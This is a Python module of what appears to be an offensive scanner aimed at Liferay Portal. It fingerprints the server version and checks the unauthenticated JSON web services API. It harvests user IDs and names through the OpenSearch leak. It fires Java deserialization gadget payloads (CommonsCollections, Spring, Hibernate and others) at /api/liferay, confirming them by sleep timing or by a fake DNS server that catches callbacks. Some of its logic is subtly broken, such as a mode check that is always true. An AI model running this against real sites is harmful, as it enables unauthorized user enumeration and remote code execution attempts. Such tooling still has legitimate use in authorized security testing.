import requests
import requests.exceptions as exception
import re
import socket
import time
import urllib3
import logging
from tabulate import tabulate
from bs4 import BeautifulSoup as Soup
from dnslib import DNSRecord

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})


# Fake DNS server to catch query while sending DNS java deserialization payloads
def catch_dns_query():
    global sock
    rs = ""
    port = 53
    hostname = socket.gethostname()
    my_ip = socket.gethostbyname(hostname)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    sock.bind((my_ip, port))
    try:
        while True:
            data, add = sock.recvfrom(1024)
            dns = DNSRecord.parse(data)
            rs = dns.questions
            for ques in dns.questions:
                r = dns.reply()
                sock.sendto(r.pack(), add)
    except socket.timeout:
        if "google" in str(rs):
            return True
        else:
            return False


# Java Deserialization Ping Scan
def ping_deserialization(url):
    print("[DNS Scan]")
    url_reformat = re.sub('.*://', '', url)
    url_reformat = re.sub('([:/]).*', '', url_reformat)
    list_ping = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
                 "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7",
                 "Hibernate1", "Hibernate2", "Jdk7u21", "MozillaRhino1", "MozillaRhino2", "Groovy1",
                 "JRMPClient", "Myfaces1", "ROME", "Spring1", "Spring2", "Vaadin1"]

    for name in list_ping:
        payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
        time.sleep(1)
        rq = session.post(url, data=payload, verify=False)
        if catch_dns_query():
            print('\033[91m' + '    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))


# Java Deserialization Sleep Scan
def sleep_deserialization(url):
    print("[Sleep scan]")
    list_sleep = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
                  "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
                  "CommonsCollections7", "Hibernate1", "Jdk7u21", "MozillaRhino1", "MozillaRhino2", "ROME", "Spring1",
                  "Spring2", "Vaadin1"]
    for name in list_sleep:
        payload = open('core/payload_sleep/{}.bin'.format(name), 'rb')
        rq = session.post(url, data=payload, verify=False)
        #  print(name + '-' + str(rq.elapsed.total_seconds()))
        if rq.elapsed.total_seconds() >= 10:
            print('\033[91m' + "    [+] {} lib can be POTENTIAL vulnerable".format(name))
        time.sleep(0.5)


# [LPS-27146] Guests can view names of all Liferay users
def opensearch(url):
    print('\033[93m' + "[!] OpenSearch Gathering" + '\033[91m')
    user_info = dict()
    rq = session.get(url + "/c/search/open_search?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User",
                     verify=False, timeout=10)
    soup = Soup(rq.text, 'xml')
    entry = soup.find_all("entry")
    for attr in entry:
        link_tag = re.match('.*u_i_d=(.*)"', str(attr.find('link')))
        uid = link_tag.group(1)
        title_tag = str(attr.find('title'))
        title = re.sub("<title>", "", title_tag)
        title = re.sub("</title>", "", title)
        user_info[uid] = title
    if user_info is not None:
        for uid in user_info:
            print("UserID: " + uid + " - " + str(user_info[uid]))
    else:
        print("~> None")
    print("")


# [LPS-26935] All JSON web services are accessible without authentication
def json_api(url):
    rq = session.get(url + "/api/jsonws/user/get-user-by-id", verify=False)
    if rq.status_code == 200:
        print('\033[93m' + "[!] May have [LPS-26935] All JSON web services are accessible without authentication")
    else:
        print("~> None")
    print("")


def info_gathering(url):
    global version
    global server
    rq = session.get(url, timeout=10, verify=False)
    server = rq.headers['Server']
    version = rq.headers.get('Liferay-Portal')
    if version is None:
        rq = session.get(url + '/api/jsonws', timeout=10, verify=False)
        version = rq.headers.get('Liferay-Portal')
        if version is None:
            signatures = ["Liferay.Theme", "Liferay.Portlet", "Liferay.Util", "Liferay.Menu",
                          "Liferay.NavigationInteraction", "Liferay.Data", "Liferay.Form", "liferay-form", "liferay-menu",
                          "liferay-notice", "liferay-poller"]
            if any(x in rq.text for x in signatures):
                version = " Website using Liferay but cannot define version!"
                if version is None:
                    print('\033[94m' + "\n==== Information ====")
                    print('\033[91m' + "[!] This website is not using Liferay or cannot detect!")
                    print('\033[91m' + "Sever: " + server)
                    print("")
                    return False
                else:
                    return True
            else:
                return True
        else:
            return True
    else:
        return True


class Scan:
    def __init__(self, url, mode):
        self.url = url
        self.mode = mode

    @property
    def url_gs(self):
        return self.url

    @property
    def mode_gs(self):
        return self.mode

    @url_gs.setter
    def url_gs(self, new_url):
        self.url = new_url

    @mode_gs.setter
    def mode_gs(self, new_mode):
        self.mode = new_mode

    def show_options(self):
        header = ["Name", "Current Setting", "Required", "Description"]
        data = [("url", self.url, "yes", "Target to exploit"),
                ("mode", self.mode, "yes", "Java deserialization scan mode: Sleep / DNS"), ]
        print("")
        print(tabulate(data, headers=header))
        print("")

    def main(self):
        try:
            if self.url != "None" and self.mode == "sleep" or "dns":
                # Gathering information of target
                if info_gathering(self.url) is True:
                    print('\033[94m' + "\n==== Information ====")
                    print('\033[91m' + "Sever: " + server)
                    print('\033[91m' + "Version: " + version)
                    print("")
                    # Vulnerabilities of target
                    print('\033[94m' + "==== Vulnerabilities ====" + '\033[94m')
                    json_versions = ["6.1.0", "6.0.12", "6.1.10", "6.2.0"]
                    if version is not None:
                        if any(x in version for x in json_versions):
                            json_api(self.url)
                        if "6.1.0" in version:
                            opensearch(self.url)
                    entry_point1 = self.url + "////api/liferay"
                    if session.post(entry_point1, timeout=10, verify=False).status_code == 200:
                        print(
                            '\033[93m' + "[!] Liferay API allow POST request - May have [LPS-64441] Java Serialization "
                                         "Vulnerability")
                        if self.mode == "sleep":
                            sleep_deserialization(entry_point1)
                        elif self.mode == "dns":
                            ping_deserialization(entry_point1)
                    # elif session.post(entry_point2, timeout=10, verify=False).status_code == 200:
                    #     print(
                    #         '\033[93m' + "[!] Spring API allow POST request - May have [LPS-64441] Java Serialization "
                    #                      "Vulnerability")
                    #     if self.mode == "sleep":
                    #         sleep_deserialization(entry_point1)
                    #     elif self.mode == "dns":
                    #         ping_deserialization(entry_point1)
                    else:
                        print('\033[93m' + "[!] [LPS-64441] Java Serialization Vulnerability")
                        print('\033[93m' + "~> None")
                    print("")
            else:
                print("[!] Required option is not set!")
        except OSError as os:
            print("[+] " + str(os))
            logging.error(os)
        except IndexError:
            print("[!] Url is empty!")
            logging.error(IndexError)
        except exception.ConnectionError:
            print(exception.ConnectionError)
            logging.error("[!] Name or service not known!")
        except exception.InvalidURL and exception.MissingSchema:
            print("[!] Invalid Url - Url must start with http(s)!")
            logging.error(exception.MissingSchema)
        except Exception as ex:
            # print("[!] Something get error see the log file!")
            print(ex)
            logging.error(ex)


# Generate scan object
def scan_choose():
    global scan
    scan = Scan("None", "sleep")


# Check if vulnerability's option exists
def check_exist_option(scan_option):
    try:
        getattr(scan, scan_option)
        return True
    except AttributeError:
        return False
